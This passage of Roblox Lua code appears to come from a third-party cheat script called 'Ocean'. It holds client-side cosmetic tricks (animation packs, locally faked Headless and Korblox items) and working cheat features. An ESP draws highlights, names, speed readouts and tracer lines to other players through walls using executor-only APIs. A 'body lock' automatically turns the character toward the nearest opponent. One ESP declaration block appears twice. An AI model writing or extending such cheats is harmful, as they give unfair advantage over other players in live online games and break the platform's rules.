    destroyHighPingWarn()
    if not highPingWarnEnabled then return end
    local sg = Instance.new("ScreenGui")
    sg.Name = "OceanHighPingWarn"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 200
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    parentGui(sg)
    _highPingGui = sg
    local frame = Instance.new("Frame")
    frame.Name = "Warn"
    frame.AnchorPoint = Vector2.new(1, 0)
    frame.Position = UDim2.new(1, -12, 0, 12)
    frame.Size = UDim2.fromOffset(210, 44)
    frame.BackgroundColor3 = Color3.fromRGB(40, 8, 10)
    frame.BackgroundTransparency = 0.15
    frame.BorderSizePixel = 0
    frame.Visible = false
    frame.Parent = sg
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke", frame)
    st.Color = Color3.fromRGB(255, 60, 60)
    st.Thickness = 1.5
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.fromScale(1, 1)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 14
    lbl.TextColor3 = Color3.fromRGB(255, 90, 90)
    lbl.Text = "HIGH PING!!\ndon't duel"
    lbl.TextWrapped = true
    lbl.Parent = frame
    local lastPing = 0
    _highPingConn = RunService.Heartbeat:Connect(function()
        if not highPingWarnEnabled or not frame.Parent then return end
        local ping = 0
        pcall(function()
            ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
        end)
        lastPing = ping
        local thresh = tonumber(highPingThreshold) or 150
        if ping >= thresh then
            frame.Visible = true
            lbl.Text = string.format("HIGH PING!! %dms\ndon't duel", ping)
        else
            frame.Visible = false
        end
    end)
end

bodyColorMode = "Normal"
bodyColorSaved = {}
bodyLockEnabled = false -- permanently disabled (removed)
bodyLockRange = 60
bodyLockConn = nil
autoResetOnDieEnabled=false
autoResetOnMedusaEnabled=false
_oceanResetBusy=false
OCEAN_RESET_TP=CFrame.new(2000.5, 9911.9, 4000.2)

local ANIMATION_PACKS={
    ["Adidas Sports"]={WalkAnim=18537392113,RunAnim=18537384940,JumpAnim=18537380791,FallAnim=18537367238,SwimIdle=18537387180,Swim=18537389531,Animation1=18537376492,Animation2=18537371272,ClimbAnim=18537363391},
    ["Adidas Community"]={WalkAnim=122150855457006,RunAnim=82598234841035,JumpAnim=75290611992385,FallAnim=98600215928904,SwimIdle=109346520324160,Swim=133308483266208,Animation1=122257458498464,Animation2=102357151005774,ClimbAnim=88763136693023},
    ["Adidas Aura"]={WalkAnim=83842218823011,RunAnim=118320322718866,JumpAnim=109996626521204,FallAnim=95603166884636,SwimIdle=94922130551805,Swim=134530128383903,Animation1=110211186840347,Animation2=114191137265065,ClimbAnim=97824616490448},
    ["Wicked Popular"]={WalkAnim=92072849924640,RunAnim=72301599441680,JumpAnim=104325245285198,FallAnim=121152442762481,Animation1=118832222982049,ClimbAnim=131326830509784,SwimIdle=113199415118199,Swim=99384245425157,Animation2=76049494037641},
    Elder={WalkAnim=10921111375,RunAnim=10921104374,JumpAnim=10921107367,FallAnim=10921105765,SwimIdle=10921110146,Swim=10921108971,ClimbAnim=10921100400,Animation1=10921101664,Animation2=10921102574},
    Zombie={WalkAnim=10921355261,RunAnim=616163682,JumpAnim=10921351278,FallAnim=10921350320,SwimIdle=10921353442,Swim=10921352344,Animation1=10921344533,Animation2=10921345304,ClimbAnim=10921343576},
    Mage={WalkAnim=10921152678,RunAnim=10921148209,JumpAnim=10921149743,FallAnim=10921148939,SwimIdle=10921151661,Swim=10921150788,ClimbAnim=10921143404,Animation1=10921144709,Animation2=10921145797},
    ["Catwalk Glam"]={WalkAnim=109168724482748,RunAnim=81024476153754,JumpAnim=116936326516985,FallAnim=92294537340807,SwimIdle=98854111361360,Swim=134591743181628,ClimbAnim=119377220967554,Animation1=133806214992291,Animation2=94970088341563},
    Astronaut={WalkAnim=10921046031,RunAnim=10921039308,JumpAnim=10921042494,FallAnim=10921040576,SwimIdle=10921045006,Swim=10921044000,ClimbAnim=10921032124,Animation1=10921034824,Animation2=10921036806},
    ['Wicked "Dancing Through Life"']={WalkAnim=73718308412641,RunAnim=135515454877967,JumpAnim=78508480717326,FallAnim=78147885297412,SwimIdle=129183123083281,Swim=110657013921774,ClimbAnim=129447497744818,Animation1=92849173543269,Animation2=132238900951109},
    Werewolf={WalkAnim=10921342074,RunAnim=10921336997,FallAnim=10921337907,SwimIdle=10921341319,Swim=10921340419,ClimbAnim=10921329322,Animation1=10921330408,Animation2=10921333667},
    Superhero={WalkAnim=10921298616,RunAnim=10921291831,JumpAnim=10921294559,FallAnim=10921293373,SwimIdle=10921297391,Swim=10921295495,ClimbAnim=10921286911,Animation1=10921288909,Animation2=10921290167},
    Toy={WalkAnim=10921312010,RunAnim=10921306285,JumpAnim=10921308158,FallAnim=10921307241,SwimIdle=10921310341,Swim=10921309319,ClimbAnim=10921300839,Animation1=10921301576},
    ["No Boundaries"]={WalkAnim=18747074203,RunAnim=18747070484,JumpAnim=18747069148,FallAnim=18747062535,SwimIdle=18747071682,Swim=18747073181,ClimbAnim=18747060903,Animation1=18747067405,Animation2=18747063918},
    NFL={WalkAnim=110358958299415,RunAnim=117333533048078,JumpAnim=119846112151352,FallAnim=129773241321032,SwimIdle=79090109939093,Swim=132697394189921,ClimbAnim=134630013742019,Animation1=92080889861410,Animation2=74451233229259},
    ["Amazon Unboxed"]={WalkAnim=90478085024465,RunAnim=134824450619865,JumpAnim=121454505477205,FallAnim=94788218468396,SwimIdle=129126268464847,Swim=105962919001086,ClimbAnim=121145883950231,Animation1=98281136301627},
    Vampire={WalkAnim=10921326949,RunAnim=10921320299,JumpAnim=10921322186,FallAnim=10921321317,SwimIdle=10921325443,Swim=10921324408,ClimbAnim=10921314188,Animation1=10921315373},
    Ninja={Run=656118852,Walk=656121766,Jump=656117878,Fall=656115606,Swim=656119721,SwimIdle=656121397,Climb=656114359,Idle={656117400,656118341,886742569}},
    Robot={Run=616091570,Walk=616095330,Jump=616090535,Fall=616087089,Swim=616092998,SwimIdle=616094091,Climb=616086039,Idle={616088211,616089559,885531463}},
    Levitation={Run=616010382,Walk=616013216,Jump=616008936,Fall=616005863,Swim=616011509,SwimIdle=616012453,Climb=616003713,Idle={616006778,616008087,886862142}},
    Stylish={Run=616140816,Walk=616146177,Jump=616139451,Fall=616134815,Swim=616143378,SwimIdle=616144772,Climb=616133594,Idle={616136790,616138447,886888594}},
    Bubbly={Run=910025107,Walk=910034870,Jump=910016857,Fall=910001910,Swim=910028158,SwimIdle=910030921,Climb=909997997,Idle={910004836,910009958,1018536639}},
    Cartoon={Run=742638842,Walk=742640026,Jump=742637942,Fall=742637151,Swim=742639220,SwimIdle=742639812,Climb=742636889,Idle={742637544,742638445,885477856}},
}
selectedAnimPack = "Adidas Sports"
local function animPick(pack,...)
    for i=1,select("#",...) do local v=pack[select(i,...)]; if v~=nil then return v end end
end
local function ensureAnimation(folder,name)
    if not folder then return nil end
    local obj=folder:FindFirstChild(name)
    if not obj then obj=Instance.new("Animation"); obj.Name=name; obj.Parent=folder end
    return obj
end
applyingAnimPack=false
function applyAnimationPack(packName,char)
    if applyingAnimPack then return false end
    local pack=ANIMATION_PACKS[packName]; if not pack then return false end
    applyingAnimPack=true
    char=char or LP.Character
    if not char then applyingAnimPack=false; return false end
    local animate,animateReady
    for _=1,40 do
        animate=char:FindFirstChild("Animate")
        if animate and animate:FindFirstChild("idle") and animate:FindFirstChild("run") and animate:FindFirstChild("walk") then animateReady=true; break end
        task.wait(.1)
    end
    if not animateReady then applyingAnimPack=false; return false end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then for _,track in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() track:Stop(0) end) end end
    local function set(folder,objName,id) local obj=ensureAnimation(animate:FindFirstChild(folder),objName); if obj and id then obj.AnimationId="rbxassetid://"..tostring(id) end end
    set("walk","WalkAnim",animPick(pack,"WalkAnim","Walk")); set("run","RunAnim",animPick(pack,"RunAnim","Run"))
    set("jump","JumpAnim",animPick(pack,"JumpAnim","Jump")); set("fall","FallAnim",animPick(pack,"FallAnim","Fall"))
    set("climb","ClimbAnim",animPick(pack,"ClimbAnim","Climb")); set("swim","Swim",animPick(pack,"Swim"))
    set("swimidle","SwimIdle",animPick(pack,"SwimIdle") or animPick(pack,"Swim"))
    local idle=animate:FindFirstChild("idle")
    if idle then
        local ids=pack.Idle or {animPick(pack,"Animation1"),animPick(pack,"Animation2")}
        if ids[1] or ids[2] then
            local id1=ids[1] or ids[2]; local id2=ids[2] or ids[1]
            local a1=ensureAnimation(idle,"Animation1"); local a2=ensureAnimation(idle,"Animation2")
            if a1 then a1.AnimationId="rbxassetid://"..tostring(id1) end
            if a2 then a2.AnimationId="rbxassetid://"..tostring(id2) end
            for i=3,#ids do local a=ensureAnimation(idle,"Animation"..i); if a then a.AnimationId="rbxassetid://"..tostring(ids[i]) end end
        end
    end
    animate.Disabled=true; task.wait(.06); animate.Disabled=false
    if hum then pcall(function() hum:ChangeState(Enum.HumanoidStateType.Landed); task.wait(.03); hum:ChangeState(Enum.HumanoidStateType.Running) end) end
    selectedAnimPack=packName; applyingAnimPack=false; return true
end

function startAnimToggle()
    animEnabled = true
    local char = LP and LP.Character
    if char and selectedAnimPack then
        task.spawn(function() applyAnimationPack(selectedAnimPack, char) end)
    end
    if AnimRefs.heartbeat then pcall(function() AnimRefs.heartbeat:Disconnect() end) end
    AnimRefs.heartbeat = RunService.Heartbeat:Connect(function()
        if not animEnabled then return end
        local c = LP and LP.Character
        if c and selectedAnimPack and not applyingAnimPack then
        end
    end)
end

function stopAnimToggle()
    animEnabled = false
    if AnimRefs.heartbeat then pcall(function() AnimRefs.heartbeat:Disconnect() end); AnimRefs.heartbeat = nil end
end

pcall(function()
    LP.CharacterAdded:Connect(function(char)
        if animEnabled and selectedAnimPack then
            task.defer(function()
                task.wait(0.5)
                pcall(applyAnimationPack, selectedAnimPack, char)
            end)
        end
    end)
end)

AnimRefs = { heartbeat=nil, savedAnimate=nil, originalAnims=nil }

local HEADLESS_ASSET = {
    id = "rbxassetid://134082579",
    targetBodyPart = "Head",
    partsToHide = {"Head"},
    scale = Vector3.new(1, 1, 1),
    audio = "rbxassetid://135315310485417",
    offset = CFrame.new(),
}

local KORBLOX_ASSETS = {
    {
        name = "Left Leg",
        id = "rbxassetid://139607673",
        targetBodyPart = "LeftUpperLeg",
        partsToHide = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot"},
        scale = Vector3.new(1, 1, 1),
        audio = "rbxassetid://87998522263554",
        offset = CFrame.new(),
    },
    {
        name = "Right Leg",
        id = "rbxassetid://139607718",
        targetBodyPart = "RightUpperLeg",
        partsToHide = {"RightUpperLeg", "RightLowerLeg", "RightFoot"},
        scale = Vector3.new(1, 1, 1),
        audio = "rbxassetid://135315310485417",
        offset = CFrame.new(),
    },
}

local AppearanceState = {headlessParts = {}, korbloxParts = {}}

local function clearAppearancePartState(state)
    for part in pairs(state) do state[part] = nil end
end

local function hideAppearanceParts(state, character, partNames)
    for _, partName in ipairs(partNames) do
        local part = character:FindFirstChild(partName)
        if part and part:IsA("BasePart") then
            if state[part] == nil then state[part] = part.Transparency end
            part.Transparency = 1
        end
    end
end

local function restoreAppearanceParts(state)
    for part, transparency in pairs(state) do
        if part and part.Parent and part:IsA("BasePart") then part.Transparency = transparency end
    end
    clearAppearancePartState(state)
end

local function removeAvatarMesh(character, groupName, itemName)
    if not character then return end
    local asset = character:FindFirstChild(groupName .. "_" .. itemName:gsub("%s+", ""))
    if asset then asset:Destroy() end
end

local function equipAvatarMesh(groupName, itemName, config, hiddenParts)
    local character = player.Character
    if not character then return false, "Character not found" end

    local targetPart = character:FindFirstChild(config.targetBodyPart)
    if not targetPart then return false, "This appearance requires an R15 character" end

    local success, objects = pcall(function()
        return game:GetObjects(config.id)
    end)
    if not success or not objects or #objects == 0 then
        return false, "Could not load the asset"
    end

    local assetModel = objects[1]
    local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
    if not mainMesh then
        pcall(function() assetModel:Destroy() end)
        return false, "No mesh was found in the asset"
    end

    local assetName = groupName .. "_" .. itemName:gsub("%s+", "")
    removeAvatarMesh(character, groupName, itemName)
    assetModel.Name = assetName
    mainMesh.Size = mainMesh.Size * config.scale
    mainMesh.CanCollide = false
    mainMesh.CFrame = targetPart.CFrame * config.offset

    local weld = Instance.new("WeldConstraint")
    weld.Part0 = targetPart
    weld.Part1 = mainMesh
    weld.Parent = mainMesh
    assetModel.Parent = character
    hideAppearanceParts(hiddenParts, character, config.partsToHide)

    if config.audio then
        local sound = Instance.new("Sound")
        sound.SoundId = config.audio
        sound.Volume = 0.5
        sound.Parent = mainMesh
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 3)
    end

    return true
end

function setHeadlessAppearance(on)
    local character = player.Character
    if not character then return false, "Character not found" end

    -- Astfel functioneaza pe orice avatar care are o piesa "Head".
    local head = character:FindFirstChild("Head")
    if not head or not head:IsA("BasePart") then
        return false, "Head not found"
    end
    if not on then
        removeAvatarMesh(character, "Headless", "Headless")
        restoreAppearanceParts(AppearanceState.headlessParts)
        return true
    end

    hideAppearanceParts(AppearanceState.headlessParts, character, {"Head"})
    return true
end

local function clearKorbloxAppearance(character)
    for _, config in ipairs(KORBLOX_ASSETS) do
        removeAvatarMesh(character, "Korblox", config.name)
    end
    restoreAppearanceParts(AppearanceState.korbloxParts)
end

function setKorbloxAppearance(on)
    local character = player.Character
    if not character then return false, "Character not found" end
    if not on then
        clearKorbloxAppearance(character)
        return true
    end

    clearKorbloxAppearance(character)
    for _, config in ipairs(KORBLOX_ASSETS) do
        local shouldEquip = korbloxLeg == "Both"
            or (korbloxLeg == "Left" and config.name == "Left Leg")
            or (korbloxLeg == "Right" and config.name == "Right Leg")
        if shouldEquip then
            local ok, err = equipAvatarMesh("Korblox", config.name, config, AppearanceState.korbloxParts)
            if not ok then
                clearKorbloxAppearance(character)
                return false, err
            end
        end
    end
    return true
end

local function clearBodyColorState()
    for part in pairs(bodyColorSaved) do bodyColorSaved[part] = nil end
end

local function isKorbloxOrHeadlessPart(part)
    if not part then return false end
    local p = part
    while p do
        local n = tostring(p.Name or "")
        if n:find("Korblox") or n:find("Headless") or n:find("OceanESP") then return true end
        p = p.Parent
        if p and p:IsA("Model") and p == player.Character then break end
        if p and Players:GetPlayerFromCharacter(p) then break end
    end
    return false
end

local function restoreBodyColor(character)
    for part, data in pairs(bodyColorSaved) do
        if part and part.Parent and part:IsA("BasePart") then
            pcall(function()
                part.Color = data.Color
                part.Material = data.Material
                if data.Transparency ~= nil then part.Transparency = data.Transparency end
            end)
        end
    end
    clearBodyColorState()
end

local function applyBodyColorBlack(character)
    if not character then return false, "Character not found" end
    for _, obj in ipairs(character:GetChildren()) do
        if obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") or obj:IsA("Clothing") then
            pcall(function() obj:Destroy() end)
        end
    end
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            if part.Name == "HumanoidRootPart" then
                -- skip
            elseif isKorbloxOrHeadlessPart(part) then
                -- keep Korblox / special meshes as-is
            else
                if bodyColorSaved[part] == nil then
                    bodyColorSaved[part] = {Color=part.Color, Material=part.Material, Transparency=part.Transparency}
                end
                pcall(function()
                    part.Color = Color3.fromRGB(0, 0, 0)
                    part.Material = Enum.Material.SmoothPlastic
                    if part.Transparency < 1 then part.Transparency = 0 end
                end)
            end
        elseif (part:IsA("Decal") or part:IsA("Texture")) and not isKorbloxOrHeadlessPart(part) then
            if part.Name == "face" or part.Parent and part.Parent.Name == "Head" then
                -- leave face
            else
                pcall(function() part.Transparency = 1 end)
            end
        end
    end
    -- Hide non-korblox accessories
    for _, acc in ipairs(character:GetChildren()) do
        if (acc:IsA("Accessory") or acc:IsA("Hat")) and not tostring(acc.Name):find("Korblox") then
            for _, d in ipairs(acc:GetDescendants()) do
                if d:IsA("BasePart") or d:IsA("MeshPart") then
                    if bodyColorSaved[d] == nil then
                        bodyColorSaved[d] = {Color=d.Color, Material=d.Material, Transparency=d.Transparency}
                    end
                    pcall(function() d.Transparency = 1 end)
                elseif d:IsA("Decal") then
                    pcall(function() d.Transparency = 1 end)
                end
            end
        end
    end
    return true
end

function setBodyColorMode(mode)
    local character = player.Character
    if not character then return false, "Character not found" end
    restoreBodyColor(character)
    bodyColorMode = mode or "Normal"
    if bodyColorMode == "Black" then
        return applyBodyColorBlack(character)
    end
    return true
end

local function nearestBodyLockTarget()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local nearest, shortest = nil, math.huge
    local radius = tonumber(bodyLockRange) or 60
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tr = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tr and hum and hum.Health > 0 then
                local dist = (tr.Position - root.Position).Magnitude
                if dist <= radius and dist < shortest then
                    shortest = dist
                    nearest = plr
                end
            end
        end
    end
    return nearest
end

function stopBodyLock()
    bodyLockEnabled = false
    if bodyLockConn then
        pcall(function() bodyLockConn:Disconnect() end)
        bodyLockConn = nil
    end
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then
        pcall(function() hum.AutoRotate = true end)
    end
    local char = LP.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            for _, name in ipairs({"OceanBodyLockAO", "OceanBodyLockAtt"}) do
                local obj = root:FindFirstChild(name)
                if obj then pcall(function() obj:Destroy() end) end
            end
        end
    end
end

function startBodyLock()
    if bodyLockConn then return end
    bodyLockEnabled = true
    bodyLockConn = RunService.Heartbeat:Connect(function()
        if not bodyLockEnabled then return end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum or hum.Health <= 0 then return end
        local target = nearestBodyLockTarget()
        local tr = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if tr then
            local offset = Vector3.new(tr.Position.X, root.Position.Y, tr.Position.Z) - root.Position
            if offset.Magnitude > 0.1 then
                hum.AutoRotate = false
                local cross = root.CFrame.LookVector:Cross(offset.Unit)
                local av = root.AssemblyAngularVelocity
                root.AssemblyAngularVelocity = Vector3.new(av.X, cross.Y * 40, av.Z)
            end
        else
            hum.AutoRotate = true
        end
    end)
end

-- ESP: colored character outlines (Highlight) + tracer lines from local torso → target torso
local espGui, espRenderConn, espPlayerAddedConn, espPlayerRemovingConn = nil, nil, nil, nil
local espEntries = {}
local hasDrawing = (type(Drawing) == "table" and type(Drawing.new) == "function")

-- ESP: colored character outlines (Highlight) + tracer lines from local torso → target torso
local espGui, espRenderConn, espPlayerAddedConn, espPlayerRemovingConn = nil, nil, nil, nil
local espEntries = {}
local hasDrawing = (type(Drawing) == "table" and type(Drawing.new) == "function")

local function removeBlueESPEntry(target)
    local entry = espEntries[target]
    if entry then
        if entry.highlight then pcall(function() entry.highlight:Destroy() end) end
        if entry.line then
            pcall(function()
                if entry.line.Remove then entry.line:Remove()
                elseif entry.line.Destroy then entry.line:Destroy() end
            end)
        end
        if entry.nameLabel then pcall(function() entry.nameLabel:Destroy() end) end
        if entry.speedLabel then pcall(function() entry.speedLabel:Destroy() end) end
        if entry.nameBg then pcall(function() entry.nameBg:Destroy() end) end
        if entry.ownerBg then pcall(function() entry.ownerBg:Destroy() end) end
        espEntries[target] = nil
    end
end

local function addBlueESPEntry(target)
    if not espGui or target == player or espEntries[target] then return end
    local a = Color3.fromRGB(55, 55, 60)
    local outline = Color3.fromRGB(12, 12, 14)

    local highlight = Instance.new("Highlight")
    highlight.Name = "HeartlessESP_HL_" .. target.UserId
    highlight.FillColor = a
    highlight.OutlineColor = outline
    highlight.FillTransparency = 0.85
    highlight.OutlineTransparency = 0
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Enabled = false
    highlight.Parent = espGui

    -- Fixed-size 2D speed tracer (same style as local HUD, never scales with distance)
    local nameBg = Instance.new("Frame")
    nameBg.Name = "HeartlessESP_NameBg_" .. target.UserId
    nameBg.BackgroundTransparency = 1
    nameBg.BorderSizePixel = 0
    nameBg.Visible = false
    nameBg.ZIndex = 50
    nameBg.Size = UDim2.fromOffset(120, 48) -- fixed forever
    nameBg.Parent = espGui

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "CharacterName"
    nameLabel.Size = UDim2.new(1, 0, 0, 16)
    nameLabel.Position = UDim2.fromOffset(0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.Text = target.Name
    nameLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
    nameLabel.TextSize = 11
    nameLabel.TextScaled = false
    nameLabel.TextXAlignment = Enum.TextXAlignment.Center
    nameLabel.TextStrokeTransparency = 0.4
    nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameLabel.ZIndex = 51
    nameLabel.Parent = nameBg

    local speedLabel = Instance.new("TextLabel")
    speedLabel.Name = "SpeedReadout"
    speedLabel.Size = UDim2.new(1, 0, 0, 28)
    speedLabel.Position = UDim2.fromOffset(0, 16)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Font = Enum.Font.GothamBlack
    speedLabel.Text = "0"
    speedLabel.TextColor3 = a
    speedLabel.TextSize = 22
    speedLabel.TextScaled = false
    speedLabel.TextXAlignment = Enum.TextXAlignment.Center
    speedLabel.TextStrokeTransparency = 0.25
    speedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    speedLabel.ZIndex = 51
    speedLabel.Parent = nameBg

    local ownerBg = Instance.new("Frame")
    ownerBg.Name = "HeartlessESP_Owner_" .. target.UserId
    ownerBg.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
    ownerBg.BackgroundTransparency = 0.15
    ownerBg.BorderSizePixel = 0
    ownerBg.Visible = false
    ownerBg.ZIndex = 52
    ownerBg.Size = UDim2.fromOffset(120, 22) -- fixed forever
    ownerBg.Parent = espGui
    Instance.new("UICorner", ownerBg).CornerRadius = UDim.new(0, 6)
    local ownerStroke = Instance.new("UIStroke")
    ownerStroke.Thickness = 1.5
    ownerStroke.Color = a
    ownerStroke.Parent = ownerBg
    local ownerLabel = Instance.new("TextLabel")
    ownerLabel.Size = UDim2.fromScale(1, 1)
    ownerLabel.BackgroundTransparency = 1
    ownerLabel.Text = "Ocean Owner"
    ownerLabel.Font = Enum.Font.GothamBlack
    ownerLabel.TextSize = 12
    ownerLabel.TextScaled = false
    ownerLabel.TextColor3 = a
    ownerLabel.TextStrokeTransparency = 0.3
    ownerLabel.ZIndex = 53
    ownerLabel.Parent = ownerBg
    local nameStroke = nil

    local line = nil
    if hasDrawing then
        line = Drawing.new("Line")
        line.Visible = false
        line.Color = a
        line.Thickness = 1.6
        line.Transparency = 0.15
        line.From = Vector2.zero
        line.To = Vector2.zero
    end

    espEntries[target] = {
        highlight = highlight,
        nameLabel = nameLabel,
        speedLabel = speedLabel,
        nameBg = nameBg,
        nameStroke = nameStroke,
        ownerBg = ownerBg,
        ownerLabel = ownerLabel,
        ownerStroke = ownerStroke,
        line = line,
    }
end

local function updateBlueESP()
    local camera = workspace.CurrentCamera
    if not camera then return end
    local localChar = player.Character
    local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
    local localScreen = nil
    if localRoot then
        local sp, onScreen = camera:WorldToViewportPoint(localRoot.Position)
        if onScreen and sp.Z > 0 then
            localScreen = Vector2.new(sp.X, sp.Y)
        end
    end

    for target, entry in pairs(espEntries) do
        local character = target.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local root = character and character:FindFirstChild("HumanoidRootPart")
        local head = character and character:FindFirstChild("Head")

        if not character or not humanoid or humanoid.Health <= 0 or not root then
            if entry.highlight then entry.highlight.Enabled = false; entry.highlight.Adornee = nil end
            if entry.nameBg then entry.nameBg.Visible = false end
            if entry.ownerBg then entry.ownerBg.Visible = false end
            if entry.line then entry.line.Visible = false end
        else
            if entry.highlight then
                if entry.highlight.Adornee ~= character then
                    entry.highlight.Adornee = character
                    entry.highlight.Parent = character
                end
                entry.highlight.Enabled = true
                entry.highlight.OutlineColor = ACCENT_COLOR
                entry.highlight.FillColor = ACCENT_COLOR
            end

            if head and entry.nameBg then
                local headTop = head.Position + Vector3.new(0, head.Size.Y * 0.5 + 0.55, 0)
                local screenPos, visible = camera:WorldToViewportPoint(headTop)
                if visible and screenPos.Z > 0 then
                    local tname = character.Name
                    local vel = 0
                    pcall(function()
                        vel = root.AssemblyLinearVelocity.Magnitude
                    end)
                    -- Same layout as local speed tracer; size NEVER changes with distance
                    local boxW, boxH = 120, 48
                    entry.nameBg.Size = UDim2.fromOffset(boxW, boxH)
                    entry.nameLabel.Text = tname
                    entry.nameLabel.TextSize = 11
                    entry.nameLabel.TextScaled = false
                    if entry.speedLabel then
                        -- Big number like local HUD (velocity is what you actually see moving)
                        entry.speedLabel.Text = tostring(math.floor(vel + 0.5))
                        entry.speedLabel.TextColor3 = ACCENT_COLOR
                        entry.speedLabel.TextSize = 22
                        entry.speedLabel.TextScaled = false
                    end
                    entry.nameBg.Position = UDim2.fromOffset(screenPos.X - boxW * 0.5, screenPos.Y - 44)
                    entry.nameBg.Visible = true

                    local isOwner = false
                    pcall(function()
                        if OCEAN_OWNER_IDS and OCEAN_OWNER_IDS[target.UserId] then
                            isOwner = true
                        else
                            local n = string.lower(tostring(target.Name or ""))
                            local d = string.lower(tostring(target.DisplayName or ""))
                            if OCEAN_OWNER_NAMES and (OCEAN_OWNER_NAMES[n] or OCEAN_OWNER_NAMES[d]) then
                                isOwner = true
                            end
                        end
                    end)
                    if entry.ownerBg then
                        if isOwner then
                            local ow, oh = 120, 22
                            entry.ownerBg.Size = UDim2.fromOffset(ow, oh)
                            entry.ownerBg.Position = UDim2.fromOffset(screenPos.X - ow * 0.5, screenPos.Y - 70)
                            entry.ownerBg.Visible = true
                            if entry.ownerLabel then
                                entry.ownerLabel.TextColor3 = ACCENT_COLOR
                                entry.ownerLabel.TextScaled = false
                            end
                            if entry.ownerStroke then entry.ownerStroke.Color = ACCENT_COLOR end
                        else
                            entry.ownerBg.Visible = false
                        end
                    end
                else
                    entry.nameBg.Visible = false
                    if entry.ownerBg then entry.ownerBg.Visible = false end
                end
            end
            if entry.line and root then
                local spd = 16
                pcall(function() spd = root.AssemblyLinearVelocity.Magnitude end)
                entry.line.Thickness = math.clamp(1.2 + (spd / 40), 1.2, 4)
            end

            if entry.line and localScreen and root then
                local targetScreen, tVisible = camera:WorldToViewportPoint(root.Position)
                if tVisible and targetScreen.Z > 0 then
                    entry.line.From = localScreen
                    entry.line.To = Vector2.new(targetScreen.X, targetScreen.Y)
                    entry.line.Color = ACCENT_COLOR
                    entry.line.Visible = true
                else
                    entry.line.Visible = false
                end
            elseif entry.line then
                entry.line.Visible = false
            end
        end
    end
end

local function clearSpeedESP()
    for plr, entry in pairs(speedEspEntries) do
        pcall(function()
            if entry.bb then entry.bb:Destroy() end
        end)
        speedEspEntries[plr] = nil
    end
end

local function ensureSpeedESPEntry(plr)
    if plr == LP then return end
    local entry = speedEspEntries[plr]
    if entry and entry.bb and entry.bb.Parent then return entry end
    local bb = Instance.new("BillboardGui")
    bb.Name = "OceanSpeedESP"
    bb.Size = UDim2.fromOffset(132, 36)
    bb.StudsOffset = Vector3.new(0, 3.0, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 600
    local bg = Instance.new("Frame")
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
    bg.BackgroundTransparency = 0.2
    bg.BorderSizePixel = 0
    bg.Parent = bb
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 8)
    local st = Instance.new("UIStroke", bg)
    st.Color = ACCENT_COLOR
    st.Thickness = 1
    st.Transparency = 0.4
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.fromScale(1, 1)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextColor3 = ACCENT_COLOR
    lbl.TextStrokeTransparency = 0.5
    lbl.Text = "0"
    lbl.Parent = bg
    speedEspEntries[plr] = {bb = bb, lbl = lbl, stroke = st}
    return speedEspEntries[plr]
end

function startSpeedESP()
    -- Speed ESP removed
    speedEspEnabled = false
    if speedEspConn then
        pcall(function() speedEspConn:Disconnect() end)
        speedEspConn = nil
    end
end

function stopSpeedESP()
    speedEspEnabled = false
    if speedEspConn then speedEspConn:Disconnect(); speedEspConn = nil end
    clearSpeedESP()
end

local function startBlueESP()
    if espRenderConn then return end
    espGui = Instance.new("ScreenGui")
    espGui.Name = "HeartlessESP"
    espGui.ResetOnSpawn = false
    espGui.IgnoreGuiInset = true
    espGui.DisplayOrder = 1000
    parentGui(espGui)

    for _, target in ipairs(Players:GetPlayers()) do addBlueESPEntry(target) end
    espPlayerAddedConn = Players.PlayerAdded:Connect(addBlueESPEntry)
    espPlayerRemovingConn = Players.PlayerRemoving:Connect(removeBlueESPEntry)
    espRenderConn = RunService.RenderStepped:Connect(updateBlueESP)
end

local function stopBlueESP()
    if espRenderConn then espRenderConn:Disconnect(); espRenderConn = nil end
    if espPlayerAddedConn then espPlayerAddedConn:Disconnect(); espPlayerAddedConn = nil end
    if espPlayerRemovingConn then espPlayerRemovingConn:Disconnect(); espPlayerRemovingConn = nil end
    for target in pairs(espEntries) do removeBlueESPEntry(target) end
